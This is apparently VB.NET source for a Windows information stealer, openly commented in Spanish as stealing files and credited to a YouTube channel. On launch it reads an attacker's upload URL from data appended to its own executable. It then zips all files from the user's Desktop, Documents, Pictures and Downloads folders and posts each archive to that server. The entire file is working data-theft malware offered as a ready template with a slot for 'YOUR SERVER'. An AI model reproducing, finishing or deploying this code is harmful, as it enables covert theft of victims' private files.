Imports System.IO.Packaging
Imports System.IO
Imports System.Text
Public Class Main
    Dim DIRoot As String = "C:\Users\" & Environment.UserName & "\AppData\Local\" & My.Application.Info.AssemblyName
    Dim DIRDesktop As String
    Dim DIRDocuments As String
    Dim DIRPictures As String
    Dim DIRDownloads As String
    Dim UniqueID As String

    Dim FilePostURL As String = "" 'HERE GOES YOUR SERVER

    Dim ZIPFilePathDesktop As String
    Dim ZIPFilePathDocuments As String
    Dim ZIPFilePathPictures As String
    Dim ZIPFilePathRDownloads As String

    Private Sub Main_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        'Cargamos el servidor en donde subiremos lo robado
        LoadInject()

        'evitamos que hayan ficheros antiguos que puedan causar problemas en el futuro
        If My.Computer.FileSystem.DirectoryExists(DIRoot) = True Then
            My.Computer.FileSystem.DeleteDirectory(DIRoot, FileIO.DeleteDirectoryOption.DeleteAllContents)
        End If

        'Creamos la carpeta que eliminamos para evitar problemas en el futuro
        If My.Computer.FileSystem.DirectoryExists(DIRoot) = False Then
            My.Computer.FileSystem.CreateDirectory(DIRoot)
        End If

        UniqueID = RandomString(15)

        'declaramos las rutas que se usaran para robar los archivos
        DIRDesktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        DIRDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
        DIRPictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)
        DIRDownloads = "C:\Users\" & Environment.UserName & "\Downloads"

        'declaramos las rutas de los .ZIP en donde se almacenaran los ficheros y luego seran enviados
        ZIPFilePathDesktop = DIRoot & "\" & UniqueID & "_Desktop.zip"
        ZIPFilePathDocuments = DIRoot & "\" & UniqueID & "_Documents.zip"
        ZIPFilePathPictures = DIRoot & "\" & UniqueID & "_Pictures.zip"
        ZIPFilePathRDownloads = DIRoot & "\" & UniqueID & "_Downloads.zip"

        'comenzamos!
        GetFiles()
    End Sub

    Sub LoadInject()
        Try
            FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
            Dim stubb As String = Space(LOF(1))
            Dim FileSplit = "|FTF|"
            FileGet(1, stubb)
            FileClose(1)
            Dim opt() As String = Split(stubb, FileSplit)
            FilePostURL = opt(1)
        Catch ex As Exception
            If FilePostURL = Nothing Then
                End
            End If
        End Try
    End Sub
    Sub GetFiles()
        Try
            For Each DesktopFile As String In My.Computer.FileSystem.GetFiles(DIRDesktop)
                ZipFiles(ZIPFilePathDesktop, DesktopFile)
            Next
            'enviar .ZIP Desktop
            UploadTheZIP(ZIPFilePathDesktop)

            For Each DocumentsFile As String In My.Computer.FileSystem.GetFiles(DIRDocuments)
                ZipFiles(ZIPFilePathDocuments, DocumentsFile)
            Next
            'enviar .ZIP Documents
            UploadTheZIP(ZIPFilePathDocuments)

            For Each PicturesFile As String In My.Computer.FileSystem.GetFiles(DIRPictures)
                ZipFiles(ZIPFilePathPictures, PicturesFile)
            Next
            'enviar .ZIP Pictures
            UploadTheZIP(ZIPFilePathPictures)

            For Each DownloadsFile As String In My.Computer.FileSystem.GetFiles(DIRDownloads)
                ZipFiles(ZIPFilePathRDownloads, DownloadsFile)
            Next
            'enviar .ZIP Downloads
            UploadTheZIP(ZIPFilePathRDownloads)

            'finaliza!
            End
        Catch ex As Exception

        End Try

        'NOTAS:
        '   Podriamos enviar los .ZIP a medida van terminando de recopilar. <----
        '   o   enviamos los .ZIPs cuando finalizen todos

    End Sub

    Private Function RandomString(ByRef Length As Integer) As String
        Dim str As String = Nothing
        Dim rnd As New Random
        For i As Integer = 0 To Length
            Dim chrInt As Integer = 0
            Do
                chrInt = rnd.Next(30, 122)
                If (chrInt >= 48 And chrInt <= 57) Or (chrInt >= 65 And chrInt <= 90) Or (chrInt >= 97 And chrInt <= 122) Then
                    Exit Do
                End If
            Loop
            str &= Chr(chrInt)
        Next
        Return str
    End Function

    Sub UploadTheZIP(ByVal theZipFilePath As String)
        'El POST php para subir este fichero .ZIP al servidor (Uso php post porque no quiero usar credenciales FTP que luego alquien podria ver.)

        My.Computer.Network.UploadFile(theZipFilePath, FilePostURL)

    End Sub

    'Need reference to WindowsBase.dll (Imports System.IO.Packaging)
    Private Sub ZipFiles(ByVal zipFile As String, ByVal file As String)
        Try
            Dim zip As Package = ZipPackage.Open(zipFile, IO.FileMode.OpenOrCreate, IO.FileAccess.ReadWrite)
            AddToArchive(zip, file)
            zip.Close()
        Catch
        End Try
    End Sub
    Private Sub AddToArchive(ByVal zip As Package, ByVal fileToAdd As String)
        Try
            Dim uriFileName As String = fileToAdd.Replace(" ", "_")
            Dim zipUri As String = String.Concat("/", IO.Path.GetFileName(uriFileName))
            Dim partUri As New Uri(zipUri, UriKind.Relative)
            Dim contentType As String = Net.Mime.MediaTypeNames.Application.Zip
            Dim pkgPart As PackagePart = zip.CreatePart(partUri, contentType, CompressionOption.Normal)
            Dim bites As Byte() = IO.File.ReadAllBytes(fileToAdd)
            pkgPart.GetStream().Write(bites, 0, bites.Length)
        Catch
        End Try
    End Sub
End Class
'Created by https://www.youtube.com/channel/UCSzZaz23dy19GXfSmlmxrOw (Zhenboro)